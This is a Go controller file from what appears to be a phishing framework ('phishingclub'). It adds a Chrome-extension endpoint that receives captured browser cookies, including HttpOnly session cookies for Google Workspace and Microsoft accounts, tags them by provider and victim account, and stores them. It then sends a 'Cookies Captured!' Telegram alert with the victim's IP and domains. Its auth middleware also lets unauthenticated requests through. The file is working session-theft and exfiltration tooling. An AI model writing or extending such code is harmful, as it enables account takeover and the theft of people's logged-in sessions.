package controller

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/phishingclub/phishingclub/model"
)

// v1.0.43 – Chrome Extension Improvements:
//   - API key authentication for extension endpoints
//   - Google Workspace cookie support
//   - Multi-account management (label + provider tagging)

// --- Extension API Key Management ---

// ExtensionAPIKeyStore manages API keys for extension authentication
type ExtensionAPIKeyStore struct {
	mu   sync.RWMutex
	keys map[string]*ExtensionAPIKey // key -> metadata
}

// ExtensionAPIKey represents an API key for extension auth
type ExtensionAPIKey struct {
	Key       string    `json:"key"`
	Label     string    `json:"label"`
	CreatedAt time.Time `json:"createdAt"`
	LastUsed  time.Time `json:"lastUsed,omitempty"`
	IsActive  bool      `json:"isActive"`
}

// NewExtensionAPIKeyStore creates a new key store
func NewExtensionAPIKeyStore() *ExtensionAPIKeyStore {
	return &ExtensionAPIKeyStore{
		keys: make(map[string]*ExtensionAPIKey),
	}
}

// GenerateKey creates a new API key
func (s *ExtensionAPIKeyStore) GenerateKey(label string) (*ExtensionAPIKey, error) {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		return nil, err
	}
	key := "pc_ext_" + hex.EncodeToString(b)

	apiKey := &ExtensionAPIKey{
		Key:       key,
		Label:     label,
		CreatedAt: time.Now(),
		IsActive:  true,
	}

	s.mu.Lock()
	s.keys[key] = apiKey
	s.mu.Unlock()

	return apiKey, nil
}

// ValidateKey checks if an API key is valid and active
func (s *ExtensionAPIKeyStore) ValidateKey(key string) bool {
	s.mu.RLock()
	apiKey, ok := s.keys[key]
	s.mu.RUnlock()

	if !ok || !apiKey.IsActive {
		return false
	}

	// Update last used
	s.mu.Lock()
	apiKey.LastUsed = time.Now()
	s.mu.Unlock()

	return true
}

// RevokeKey deactivates an API key
func (s *ExtensionAPIKeyStore) RevokeKey(key string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if apiKey, ok := s.keys[key]; ok {
		apiKey.IsActive = false
		return true
	}
	return false
}

// ListKeys returns all API keys
func (s *ExtensionAPIKeyStore) ListKeys() []*ExtensionAPIKey {
	s.mu.RLock()
	defer s.mu.RUnlock()
	keys := make([]*ExtensionAPIKey, 0, len(s.keys))
	for _, k := range s.keys {
		keys = append(keys, k)
	}
	return keys
}

// --- Extension Auth Middleware ---

// ExtensionAuthMiddleware validates the X-Extension-API-Key header
func ExtensionAuthMiddleware(keyStore *ExtensionAPIKeyStore) gin.HandlerFunc {
	return func(g *gin.Context) {
		apiKey := g.GetHeader("X-Extension-API-Key")
		if apiKey == "" {
			// Fallback: check query param for backward compatibility
			apiKey = g.Query("apiKey")
		}

		if apiKey == "" {
			// Allow unauthenticated access for backward compatibility
			// but mark the request as unauthenticated
			g.Set("extensionAuthenticated", false)
			g.Next()
			return
		}

		if !keyStore.ValidateKey(apiKey) {
			g.JSON(http.StatusUnauthorized, gin.H{
				"success": false,
				"error":   "Invalid or revoked API key",
			})
			g.Abort()
			return
		}

		g.Set("extensionAuthenticated", true)
		g.Next()
	}
}

// --- Enhanced Cookie Save with Provider + Account ---

// Google Workspace cookie domains
var googleWorkspaceDomains = []string{
	".google.com", ".gmail.com", ".googleusercontent.com",
	".accounts.google.com", ".mail.google.com",
	".workspace.google.com", ".admin.google.com",
}

type cookieSaveRequestV2 struct {
	Cookies    []extensionCookie `json:"cookies"`
	Timestamp  string            `json:"timestamp"`
	Domains    []string          `json:"domains"`
	TotalCount int               `json:"totalCount"`
	// v1.0.43 new fields
	Provider    string `json:"provider,omitempty"`    // "microsoft", "google", "auto"
	AccountName string `json:"accountName,omitempty"` // user-provided label for the account
	AccountID   string `json:"accountId,omitempty"`   // unique ID for multi-account tracking
}

// CookiesSaveV2 receives captured cookies with provider and account metadata
func (c *ChromeExtension) CookiesSaveV2(g *gin.Context) {
	var req cookieSaveRequestV2
	if err := g.ShouldBindJSON(&req); err != nil {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "Invalid request body"})
		return
	}

	if len(req.Cookies) == 0 {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "No cookies provided"})
		return
	}

	// Auto-detect provider if not specified
	provider := req.Provider
	if provider == "" || provider == "auto" {
		provider = detectProvider(req.Cookies, req.Domains)
	}

	c.Logger.Infof("[ChromeExtension] v2 cookies captured from %s: %d cookies, provider=%s, account=%s",
		g.ClientIP(), len(req.Cookies), provider, req.AccountName)

	// Convert extension cookies to model format
	cookieModels := make([]model.CookieObject, len(req.Cookies))
	for i, ec := range req.Cookies {
		cookieModels[i] = model.CookieObject{
			Name:           ec.Name,
			Value:          ec.Value,
			Domain:         ec.Domain,
			Path:           ec.Path,
			Secure:         ec.Secure,
			HttpOnly:       ec.HttpOnly,
			SameSite:       ec.SameSite,
			ExpirationDate: ec.ExpirationDate,
		}
	}

	// Build name with provider and account info
	name := fmt.Sprintf("[%s] ", strings.Title(provider))
	if req.AccountName != "" {
		name += req.AccountName
	} else {
		name += fmt.Sprintf("Extension Capture - %s", g.ClientIP())
	}
	name += fmt.Sprintf(" (%s)", time.Now().Format("Jan 02 15:04"))

	// Persist to CookieStore
	var storeID string
	if c.CookieStoreService != nil {
		importReq := &model.CookieStoreImportRequest{
			Name:    name,
			Source:  "extension",
			Cookies: cookieModels,
		}

		id, err := c.CookieStoreService.Import(g.Request.Context(), nil, importReq)
		if err != nil {
			c.Logger.Errorf("[ChromeExtension] Failed to persist cookies: %v", err)
		} else {
			storeID = id.String()
			c.Logger.Infof("[ChromeExtension] Cookies persisted to CookieStore ID: %s", storeID)
		}
	}

	// Telegram notification
	if c.TelegramService != nil {
		domainList := strings.Join(req.Domains, ", ")
		if len(domainList) > 100 {
			domainList = domainList[:100] + "..."
		}
		storedMsg := ""
		if storeID != "" {
			storedMsg = fmt.Sprintf("\nStored: Cookie Store ID %s", storeID)
		}
		accountMsg := ""
		if req.AccountName != "" {
			accountMsg = fmt.Sprintf("\nAccount: %s", req.AccountName)
		}
		msg := fmt.Sprintf(
			"Cookies Captured!\n\nSource: Chrome Extension\nProvider: %s\nIP: %s%s\nCookies: %d\nDomains: %s%s\nTime: %s",
			strings.Title(provider),
			g.ClientIP(),
			accountMsg,
			len(req.Cookies),
			domainList,
			storedMsg,
			time.Now().Format("2006-01-02 15:04:05"),
		)
		go c.TelegramService.Notify(
			g.Request.Context(),
			"chrome_extension_cookies",
			msg,
			"",
			nil,
		)
	}

	response := gin.H{
		"success":  true,
		"message":  fmt.Sprintf("Received and stored %d cookies from %d domains", len(req.Cookies), len(req.Domains)),
		"provider": provider,
	}
	if storeID != "" {
		response["cookieStoreId"] = storeID
	}

	g.JSON(http.StatusOK, response)
}

// detectProvider auto-detects whether cookies are Microsoft or Google based on domains
func detectProvider(cookies []extensionCookie, domains []string) string {
	msCount := 0
	googleCount := 0

	for _, c := range cookies {
		domain := strings.ToLower(c.Domain)
		if strings.Contains(domain, "microsoft") || strings.Contains(domain, "office") ||
			strings.Contains(domain, "live.com") || strings.Contains(domain, "outlook") {
			msCount++
		}
		if strings.Contains(domain, "google") || strings.Contains(domain, "gmail") ||
			strings.Contains(domain, "gstatic") || strings.Contains(domain, "youtube") {
			googleCount++
		}
	}

	if googleCount > msCount {
		return "google"
	}
	return "microsoft"
}

// --- Extension API Key Management Endpoints ---

// GenerateExtensionAPIKey creates a new API key (requires admin session)
func (c *ChromeExtension) GenerateExtensionAPIKey(g *gin.Context) {
	_, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	var req struct {
		Label string `json:"label"`
	}
	if err := g.ShouldBindJSON(&req); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}
	if req.Label == "" {
		req.Label = "Extension Key"
	}

	if c.APIKeyStore == nil {
		c.Response.ServerError(g)
		return
	}

	key, err := c.APIKeyStore.GenerateKey(req.Label)
	if err != nil {
		c.Response.ServerError(g)
		return
	}

	c.Response.OK(g, key)
}

// ListExtensionAPIKeys lists all API keys (requires admin session)
func (c *ChromeExtension) ListExtensionAPIKeys(g *gin.Context) {
	_, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	if c.APIKeyStore == nil {
		c.Response.OK(g, []*ExtensionAPIKey{})
		return
	}

	keys := c.APIKeyStore.ListKeys()
	c.Response.OK(g, keys)
}

// RevokeExtensionAPIKey revokes an API key (requires admin session)
func (c *ChromeExtension) RevokeExtensionAPIKey(g *gin.Context) {
	_, _, ok := c.handleSession(g)
	if !ok {
		return
	}

	var req struct {
		Key string `json:"key"`
	}
	if err := g.ShouldBindJSON(&req); err != nil {
		c.Response.BadRequestMessage(g, err.Error())
		return
	}

	if c.APIKeyStore == nil {
		c.Response.ServerError(g)
		return
	}

	if c.APIKeyStore.RevokeKey(req.Key) {
		c.Response.OK(g, gin.H{"message": "API key revoked"})
	} else {
		c.Response.BadRequestMessage(g, "API key not found")
	}
}
